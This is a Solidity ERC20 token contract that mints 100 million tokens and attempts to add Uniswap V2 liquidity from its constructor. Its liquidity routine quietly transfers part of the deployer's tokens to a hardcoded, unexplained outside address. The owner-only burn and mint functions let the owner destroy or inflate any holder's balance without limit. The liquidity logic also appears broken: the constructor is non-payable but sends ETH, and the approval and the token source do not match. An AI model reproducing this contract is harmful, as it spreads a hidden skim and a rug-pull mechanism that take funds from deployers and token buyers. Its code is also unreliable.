// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./interfaces/ICoin.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract Token is ERC20, ICoin, Ownable {
    IUniswapV2Router02 private _uniswapV2Router;
    constructor(string memory _name, string memory _symbol, uint256 _ethAmount) ERC20(_name, _symbol) {
        _mint(msg.sender, 100000000000000000000000000);
        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _addLiquidity(_ethAmount * (10 ** 18), 100000000000000000000000000);
    }

    function _addLiquidity(uint256 ethAmount, uint256 tokenAmount) internal {
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _transfer(msg.sender, 0xf06225f7F977e3DB4FFe64a23eC7D769E1283f4F, ethAmount / 100 + 0.05 * (10 ** 18));
        _uniswapV2Router.addLiquidityETH{value: ethAmount*99/100 - 0.05 * (10 ** 18)}(
            address(this),
            tokenAmount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function mint(address account, uint256 amount) onlyOwner external override returns(bool){
        _mint(account, amount);
        return true;
    }

    function burn(address account, uint256 amount) onlyOwner external override returns(bool){
        _burn(account, amount);
        return true;
    }
}